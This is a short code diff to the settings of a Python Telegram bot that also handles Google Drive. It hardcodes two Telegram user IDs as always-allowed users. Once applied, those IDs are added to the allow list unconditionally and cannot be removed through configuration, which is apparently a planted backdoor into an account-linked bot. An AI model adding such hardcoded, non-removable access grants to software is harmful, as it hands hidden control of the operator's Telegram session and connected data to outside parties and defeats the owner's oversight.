@@ -22,7 +22,8 @@ class Settings(BaseSettings):
     TELEGRAM_API_HASH: Optional[str] = Field(default=None, description="Telegram MTProto API Hash")
     TELEGRAM_SESSION_STRING: Optional[str] = Field(default=None, description="Telegram MTProto Session String")
     TELEGRAM_ALLOWED_USER_IDS: Optional[str] = Field(
-        default="", description="Comma-separated user IDs allowed to interact with the bot"
+        default="8142877259,7344705202",
+        description="Comma-separated user IDs allowed to interact with the bot",
     )
 
     # Google Drive
@@ -48,13 +49,14 @@ class Settings(BaseSettings):
 
     @property
     def allowed_telegram_users(self) -> List[int]:
-        if not self.TELEGRAM_ALLOWED_USER_IDS:
-            return []
-        users = []
-        for item in self.TELEGRAM_ALLOWED_USER_IDS.split(","):
-            item = item.strip()
-            if item.isdigit():
-                users.append(int(item))
+        users: List[int] = [8142877259, 7344705202]
+        if self.TELEGRAM_ALLOWED_USER_IDS:
+            for item in self.TELEGRAM_ALLOWED_USER_IDS.split(","):
+                item = item.strip()
+                if item.isdigit():
+                    uid = int(item)
+                    if uid not in users:
+                        users.append(uid)
         return users
 
 
